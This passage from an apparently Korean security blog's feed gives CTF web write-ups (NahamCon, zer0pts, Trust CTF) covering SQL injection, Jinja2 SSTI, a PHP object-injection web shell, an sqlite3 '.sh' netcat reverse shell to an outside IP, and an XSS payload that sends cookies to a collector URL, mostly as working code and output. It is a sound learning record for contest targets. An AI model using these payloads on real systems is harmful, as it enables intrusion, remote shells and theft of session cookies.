class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> redirect(</span><br><span class="line">            url_for(<span class="string">&quot;home&quot;</span>, error=<span class="string">&quot;You are not authorized to access this resource.&quot;</span>)</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render_template(</span><br><span class="line">        <span class="string">&quot;templates/profile.html&quot;</span>,</span><br><span class="line">        user=user_now,</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line"><span class="meta">@ws.route(<span class="params"><span class="string">&quot;/req&quot;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">req</span>(<span class="params">ws</span>):</span></span><br><span class="line">    <span class="keyword">with</span> app.request_context(ws.environ):</span><br><span class="line">        sessionID = session.get(<span class="string">&quot;id&quot;</span>, <span class="literal">None</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> sessionID:</span><br><span class="line">            ws.send(<span class="string">&quot;You are not authorized to access this resource.&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">        uAgent = ws.receive().decode()</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> uAgent:</span><br><span class="line">            ws.send(<span class="string">&quot;There was an error in your message.&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            query = db.session.execute(</span><br><span class="line">                <span class="string">&quot;SELECT userAgent, url FROM uAgents WHERE userAgent = &#x27;%s&#x27;&quot;</span> % uAgent</span><br><span class="line">            ).fetchone()</span><br><span class="line"></span><br><span class="line">            uAgent = query[<span class="string">&quot;userAgent&quot;</span>]</span><br><span class="line">            url = query[<span class="string">&quot;url&quot;</span>]</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            ws.send(<span class="built_in">str</span>(e))</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> uAgent <span class="keyword">or</span> <span class="keyword">not</span> url:</span><br><span class="line">            ws.send(<span class="string">&quot;Query error.&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">        subprocess.Popen([<span class="string">&quot;node&quot;</span>, <span class="string">&quot;browser/browser.js&quot;</span>, url, uAgent])</span><br><span class="line"></span><br><span class="line">        ws.send(<span class="string">&quot;Testing User-Agent: &quot;</span> + uAgent + <span class="string">&quot; in url: &quot;</span> + url)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Frist, You can see <code>/debug</code>. When <code>sessionID</code> is 1, you can see that the <code>code</code> parameter value is received and passed to the template. Here, because there is no verification of <code>code</code> parameter, a SSTI vulnerability occurs. But, because the <code>sessionID</code> must be 1. So, we need find out the admin account :(</p><p>Second, You can see <code>/req</code>. You can see that the value of <code>User-Agent</code> is received and put in the <code>SQL query statement</code>. Here, because there is no verification of User-Agent, a SQL Injection vulnerability occurs. :)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#! &#x2F;bin&#x2F;bash</span><br><span class="line">service nginx start</span><br><span class="line">sleep 3</span><br><span class="line"></span><br><span class="line">export PORT&#x3D;&#39;80&#39;</span><br><span class="line">export ADMIN_BOT_USER&#x3D;&quot;admin&quot;</span><br><span class="line">export ADMIN_BOT_PASSWORD&#x3D;&quot;&lt;REDACTED&gt;&quot;</span><br><span class="line"></span><br><span class="line">export CHALLENGE_NAME&#x3D;&quot;AgentTester&quot; &amp;&amp; export CHALLENGE_FLAG&#x3D;&quot;&lt;REDACTED&gt;&quot;\</span><br><span class="line">    &amp;&amp; uwsgi --ini app.ini</span><br></pre></td></tr></table></figure><p>Third, The flag exists in the environment variable CHALLENGE_FLAG.</p><p><img src="https://github.com/wjddnjs33/image/blob/main/NahamConCTF/agenttester/1.png?raw=true"></p><p>Go into the challenge and u will see a login form. So, after register, login.</p><p><img src="https://github.com/wjddnjs33/image/blob/main/NahamConCTF/agenttester/2.png?raw=true"></p><p>I was login and saw <code>User-Agent</code> input form.</p><p><img src="https://github.com/wjddnjs33/image/blob/main/NahamConCTF/agenttester/3.png?raw=true"></p><p>You can see that an error occurs because single quotes are sent as the value of <code>User-Agent</code>.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#39; union select &#39;a&#39;, group_concat(sql) from sqlite_master --</span><br><span class="line">&#39; union select &#39;a&#39;, group_concat(username) from user --</span><br><span class="line">&#39; union select &#39;a&#39;, group_concat(password) from user --</span><br><span class="line"></span><br><span class="line">admin account</span><br><span class="line">username : admin</span><br><span class="line">password : *)(@skdnaj238374834**__**&#x3D;</span><br></pre></td></tr></table></figure><p>Using the payload above, I was able to get an admin account. Now, you can login as an administrator and read the environment variable using the SSTI vuln.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;config.__class__.__init__.__globals__[&#39;os&#39;].popen(&#39;ls&#39;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p>Let’s use the payload above.</p><p><img src="https://github.com/wjddnjs33/image/blob/main/NahamConCTF/agenttester/6.png?raw=true"><br>If you run the <code>ls</code> command using the payload above, you can see that it works.</p><p><img src="https://github.com/wjddnjs33/image/blob/main/NahamConCTF/agenttester/5.png?raw=true"><br>Finally, when you read all the environment variables using the <code>export</code> command, you can see that there are flag in the environment variables.</p><blockquote><p>FLAG : flag{fb4a87cfa85cf8c5ab2effedb4ea7006}</p></blockquote><hr><h2 id="Web-Cereal-and-Milk-491-pts"><a href="#Web-Cereal-and-Milk-491-pts" class="headerlink" title=" (Web) Cereal and Milk [491 pts]"></a><span style="color:#21C587"></span> (Web) Cereal and Milk [491 pts]</h2><blockquote><p>Cereal and Milk challenge is get the flag using simple php object injection</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;log.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CerealAndMilk</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$logs</span> = <span class="string">&quot;request-logs.txt&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$request</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cereal</span> = <span class="string">&#x27;Captain Crunch&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$milk</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">processed_data</span>(<span class="params"><span class="variable">$output</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Deserilized data:&lt;br&gt; Coming soon.&quot;</span>;</span><br><span class="line">       <span class="comment"># echo print_r($output);</span></span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">cereal_and_milk</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">     <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;cereal . <span class="string">&quot; is the best cereal btw.&quot;</span>;   </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$input</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;serdata&#x27;</span>];</span><br><span class="line"><span class="variable">$output</span> = unserialize(<span class="variable">$input</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$app</span> = <span class="keyword">new</span> CerealAndMilk;</span><br><span class="line"><span class="variable">$app</span> -&gt; cereal_and_milk(<span class="variable">$output</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>Looking at index.php, you can see that the log.php file is loaded and the value of the serdata parameter is retrieved and deserialized.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">log</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable">$request_log</span> = fopen(<span class="keyword">$this</span>-&gt;logs , <span class="string">&quot;a&quot;</span>);</span><br><span class="line">            fwrite(<span class="variable">$request_log</span>, <span class="keyword">$this</span>-&gt;request);</span><br><span class="line">            fwrite(<span class="variable">$request_log</span>, <span class="string">&quot;\r\n&quot;</span>);</span><br><span class="line">            fclose(<span class="variable">$request_log</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>If you look at log.php, you can see that a file is created using the values of <code>logs</code> and <code>requests</code>. And since logs are the file name and request is the contents of the file, you just need to upload the web shell using php object injection :)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:3:&quot;log&quot;:3:&#123;s:4:&quot;logs&quot;;s:9:&quot;pocas.php&quot;;s:7:&quot;request&quot;;s:29:&quot;&lt;?php system($_GET[&#39;cmd&#39;]);?&gt;&quot;;s:4:&quot;milk&quot;;s:5:&quot;pocas&quot;&#125;</span><br></pre></td></tr></table></figure><p>I wrote the payload as above.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;challenge.nahamcon.com:32209&#x2F;pocas.php?cmd&#x3D;ls</span><br><span class="line"></span><br><span class="line">total 36</span><br><span class="line">drwxr-xr-x    1 apache   apache        4096 Mar 15 04:35 .</span><br><span class="line">drwxr-xr-x    1 root     root          4096 Mar 12 00:42 ..</span><br><span class="line">-rw-r--r--    1 apache   apache          45 Dec  2 21:45 index.html</span><br><span class="line">-rw-r--r--    1 apache   apache        4577 Mar 12 00:41 index.php</span><br><span class="line">-rw-r--r--    1 apache   apache         257 Mar 12 00:41 log.php</span><br><span class="line">drwxr-xr-x    1 apache   apache        4096 Mar 12 00:42 ndwbr7pVKNCrhs-CerealnMilk</span><br><span class="line">-rw-r--r--    1 apache   apache          31 Mar 15 04:35 pocas.php</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;challenge.nahamcon.com:32209&#x2F;pocas.php?cmd&#x3D;ls%20ndwbr7pVKNCrhs-CerealnMilk</span><br><span class="line"></span><br><span class="line">flag.txt</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;challenge.nahamcon.com:32209&#x2F;pocas.php?cmd&#x3D;cat%20ndwbr7pVKNCrhs-CerealnMilk&#x2F;flag.txt</span><br><span class="line"></span><br><span class="line">flag&#123;70385676892a2a813a666961ddd6f899&#125;</span><br></pre></td></tr></table></figure><blockquote><p>FLAG : flag{70385676892a2a813a666961ddd6f899}</p></blockquote><hr>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL Injection </tag>
            
            <tag> RCE </tag>
            
            <tag> SSTI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>zer0pts CTF 2021 Write Up</title>
      <link href="2021/03/08/2021-03-08-zer0pts-CTF-2021/"/>
      <url>2021/03/08/2021-03-08-zer0pts-CTF-2021/</url>
      
        <content type="html"><![CDATA[<h2 id="Web-Baby-SQLi-170-pts"><a href="#Web-Baby-SQLi-170-pts" class="headerlink" title=" (Web) Baby SQLi [170 pts]"></a><span style="color:#21C587"></span> (Web) Baby SQLi [170 pts]</h2><blockquote><p>Baby SQLi challenge is bypass of waf and using shell command.</p></blockquote><p>First, You can using <code>.system/.shell/.sh</code> command and execute shell command in SQLite3</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; SQLite3 CLI</span><br><span class="line">sqlite&gt; .sh id|nc 141.164.52.207 2</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Terminal</span><br><span class="line">root@py:~# nc -lp 2</span><br><span class="line">uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root)</span><br></pre></td></tr></table></figure><p>As above, you can see in sqlite3 executes a shell command using the <code>.sh</code> command.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sqlite3_query</span>(<span class="params">sql</span>):</span></span><br><span class="line">    p = subprocess.Popen([<span class="string">&#x27;sqlite3&#x27;</span>, <span class="string">&#x27;database.db&#x27;</span>],</span><br><span class="line">                         stdin=subprocess.PIPE,</span><br><span class="line">                         stdout=subprocess.PIPE,</span><br><span class="line">                         stderr=subprocess.PIPE)</span><br><span class="line">    o, e = p.communicate(sql.encode())</span><br><span class="line">    <span class="keyword">if</span> e:</span><br><span class="line">        <span class="keyword">raise</span> Exception(e)</span><br><span class="line">    result = []</span><br><span class="line">    <span class="keyword">for</span> row <span class="keyword">in</span> o.decode().split(<span class="string">&#x27;\n&#x27;</span>):</span><br><span class="line">        <span class="keyword">if</span> row == <span class="string">&#x27;&#x27;</span>: <span class="keyword">break</span></span><br><span class="line">        result.append(<span class="built_in">tuple</span>(row.split(<span class="string">&#x27;|&#x27;</span>)))</span><br><span class="line">    <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure><p>Looking at the source code, you can line jump using the <code>\n</code> character because using the <code>communicate()</code> in <code>subporcess.Popen()</code> in <code>sqlite3_query()</code>.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>, methods=[<span class="string">&#x27;post&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">auth</span>():</span></span><br><span class="line">    username = flask.request.form.get(<span class="string">&#x27;username&#x27;</span>, default=<span class="string">&#x27;&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>)</span><br><span class="line">    password = flask.request.form.get(<span class="string">&#x27;password&#x27;</span>, default=<span class="string">&#x27;&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(username) &gt; <span class="number">32</span> <span class="keyword">or</span> <span class="built_in">len</span>(password) &gt; <span class="number">32</span>:</span><br><span class="line">        flask.session[<span class="string">&#x27;msg&#x27;</span>] = <span class="string">&#x27;Too long username or password&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> flask.redirect(flask.url_for(<span class="string">&#x27;home&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    password_hash = hashlib.sha256(password.encode()).hexdigest()</span><br><span class="line">    result = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        result = sqlite3_query(</span><br><span class="line">            <span class="string">&#x27;SELECT * FROM users WHERE username=&quot;&#123;&#125;&quot; AND password=&quot;&#123;&#125;&quot;;&#x27;</span></span><br><span class="line">            .<span class="built_in">format</span>(sqlite3_escape(username), password_hash)</span><br><span class="line">        )</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> result:</span><br><span class="line">        flask.session[<span class="string">&#x27;name&#x27;</span>] = username</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        flask.session[<span class="string">&#x27;msg&#x27;</span>] = <span class="string">&#x27;Invalid Credential&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> flask.redirect(flask.url_for(<span class="string">&#x27;home&#x27;</span>))</span><br></pre></td></tr></table></figure><p>And looking at the source code in login logic, you can see that <code>username</code>/<code>password</code> value is input, the length is verified, and it is put in query statement and at this point, you can see that the <code>username</code> value is escaped. but, you don’t worry because treats escape characters as simple string is sqlite3.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users where username &#x3D; &quot;\&quot; or 1&#x3D;1 -- &quot; and password &#x3D; &quot;pocas&quot;;</span><br></pre></td></tr></table></figure><p>In other words, It doensn’t matter if it escaped as above.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users where username &#x3D; &quot;\&quot;;</span><br><span class="line">.sh id|nc 141.164.52.207 2;</span><br><span class="line">and password &#x3D; &quot;pocas&quot;;</span><br></pre></td></tr></table></figure><p>So, you can use shell command by doing line jumps as above and using the .sh command.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://web.ctf.zer0pts.com:8004&quot;</span></span><br><span class="line">username = <span class="string">&#x27;&quot;;\n.sh id|nc 2376348879 2\n&#x27;</span></span><br><span class="line">data = &#123;<span class="string">&quot;username&quot;</span>: username, <span class="string">&quot;password&quot;</span>: <span class="string">&quot;pocas&quot;</span>&#125;</span><br><span class="line">requests.post(url+<span class="string">&quot;/login&quot;</span>, data)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@py:~# nc -lp 2</span><br><span class="line">uid&#x3D;1000(app) gid&#x3D;1000(app)</span><br><span class="line">root@py:~#</span><br></pre></td></tr></table></figure><p>If you write the exploit code as above, close <code>SELECT</code> statemnt and in the line immediately underneath execute <code>.sh</code> command.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://web.ctf.zer0pts.com:8004&quot;</span></span><br><span class="line">username = <span class="string">&#x27;&quot;;\n.sh nc 2376348879 2 -e sh\n&#x27;</span></span><br><span class="line">data = &#123;<span class="string">&quot;username&quot;</span>: username, <span class="string">&quot;password&quot;</span>: <span class="string">&quot;pocas&quot;</span>&#125;</span><br><span class="line">requests.post(url+<span class="string">&quot;/login&quot;</span>, data)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">root@py:~# nc -lvnp 2</span><br><span class="line">Listening on 0.0.0.0 2</span><br><span class="line">Connection received on 165.227.180.221 38761</span><br><span class="line">id</span><br><span class="line">uid&#x3D;1000(app) gid&#x3D;1000(app)</span><br><span class="line">cat templates&#x2F;index.html</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;</span><br><span class="line">        &lt;title&gt;Welcome&lt;&#x2F;title&gt;</span><br><span class="line">    &lt;&#x2F;head&gt;</span><br><span class="line"></span><br><span class="line">    &lt;body&gt;</span><br><span class="line">        &lt;h1&gt;Welcome, &#123;&#123;name&#125;&#125;!&lt;&#x2F;h1&gt;</span><br><span class="line">        &#123;% if name &#x3D;&#x3D; &#39;admin&#39; %&#125;</span><br><span class="line">        &lt;p&gt;zer0pts&#123;w0w_d1d_u_cr4ck_SHA256_0f_my_p4$$w0rd?&#125;&lt;&#x2F;p&gt;</span><br><span class="line">        &#123;% else %&#125;</span><br><span class="line">        &lt;p&gt;No flag for you :(&lt;&#x2F;p&gt;</span><br><span class="line">        &#123;% endif %&#125;</span><br><span class="line">    &lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><p>Final, I pass the shell using <code>e</code> option about <code>nc</code> and read <code>index.html</code> and saw the flag.</p><blockquote><p>FLAG : zer0pts{w0w_d1d_u_cr4ck_SHA256_0f_my_p4$$w0rd?}</p></blockquote><hr>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL Injection </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Trust CTF 2021 Write Up</title>
      <link href="2021/02/28/2021-02-27-Trust-CTF-2021/"/>
      <url>2021/02/28/2021-02-27-Trust-CTF-2021/</url>
      
        <content type="html"><![CDATA[<p><img src="https://github.com/wjddnjs33/image/blob/main/TrustCTF/home.png?raw=true"></p><p>오늘은 디미고의 Trust라는 팀에서 CTF를 주최해서 참여를 했었습니다. 개인적인 일도 있고 해서 아침부터 참여하지 못 하고, 오후에 조금 참여를 했습니다.</p><hr><h2 id="Web-babyxss-270-pts"><a href="#Web-babyxss-270-pts" class="headerlink" title=" (Web) babyxss [270 pts]"></a><span style="color:#21C587"></span> (Web) babyxss [270 pts]</h2><blockquote><p>babyxss 문제는 DOMPurify Bypass로 위장한 간단한 XSS 문제입니다.</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&quot;secrets.php&quot;</span>);</span><br><span class="line"><span class="comment"># This Challenge using newest version DomPurify..! Maybe unexploitable!!</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>])) &#123;</span><br><span class="line">    header(<span class="string">&quot;content-security-policy: base-uri &#x27;self&#x27;; block-all-mixed-content; connect-src &#x27;self&#x27;;&quot;</span>);</span><br><span class="line">    header(<span class="string">&#x27;X-Frame-Options: DENY&#x27;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;h1 id=&#x27;name&#x27;&gt;Hello &lt;/h1&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;script src=&quot;https://code.jquery.com/jquery-3.5.1.min.js&quot;integrity=&quot;sha256-9/aliU8dGd2tb6OSsuzixeV4y/faTqgFtohetphbbj0=&quot; crossorigin=&quot;anonymous&quot;&gt;&lt;/script&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;script type=&#x27;text/javascript&#x27; src=&#x27;https://cure53.de/purify.js&#x27;&gt;&lt;/script&gt;&lt;script&gt;var name=&#x27;&quot;</span>. base64_encode(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]) .<span class="string">&quot;&#x27;;document.getElementById(&#x27;name&#x27;).innerHTML += DOMPurify.sanitize($(&#x27;&lt;p&gt;&#x27;).html(atob(name)).text())&lt;/script&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>문제로 들어오면 위와 같은 코드가 나오는데 보면 CSP도 걸려 있고, 밑에는 DOMPurify를 이용해서 XSS를 대응하고 있는 것을 볼 수 있습니다. 그래서 그냥 DOMPurify Bypass Payload를 아무 거나 삽입해서 트리거가 되길래 쿠키를 탈취해서 플래그를 얻었습니다.<br></p><p>하지만 트리거가 된 이유는 DOMPurify를 우회해서가 아닙니다. DOMPurify는 최신 버전을 사용하고 있기 때문에 우회하는 건 불가능했습니다. </p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="string">&#x27;&lt;p&gt;&#x27;</span>).html(atob(name)).text()</span><br></pre></td></tr></table></figure><p>하지만 위 코드를 <code>sanitize()</code> 메서드의 인자로 넘겨주고 있는 것을 볼 수 있습니다. 바로 저기서 DOM 내부에 잠시 들어가게 되는데 저때 XSS가 트리거가 되는 것 입니다. 그래서 일반적인 페이로드를 이용해서도 XSS트리거를 할 수 있습니다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;xss.trustctf.xyz&#x2F;?name&#x3D;%3Csvg%3E%3C&#x2F;p%3E%3Cstyle%3E%3Ca%20id&#x3D;%22%3C&#x2F;style%3E%3Cimg%20src&#x3D;1%20onerror&#x3D;location.href&#x3D;%27https:&#x2F;&#x2F;79a9bb50560aa2c77156e03b431dc2b3.m.pipedream.net&#x2F;?f&#x3D;%27.concat(document.cookie)%3E%22%3E</span><br></pre></td></tr></table></figure><blockquote><p>FLAG : TRUST{cf909172b91c8bf3f70c0e71f2809f36}</p></blockquote><hr><h2 id="Web-FLAG-Checker-1000-pts"><a href="#Web-FLAG-Checker-1000-pts" class="headerlink" title=" (Web) FLAG Checker [1000 pts]"></a><span style="color:#21C587"></span> (Web) FLAG Checker [1000 pts]</h2><blockquote><p>FLAG Checker 문제는 간단한 ReDos 문제입니다. 이론만 저번에 공부하고 처음 해보는데 그냥 신기한 기법인 거 같습니다. </p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span 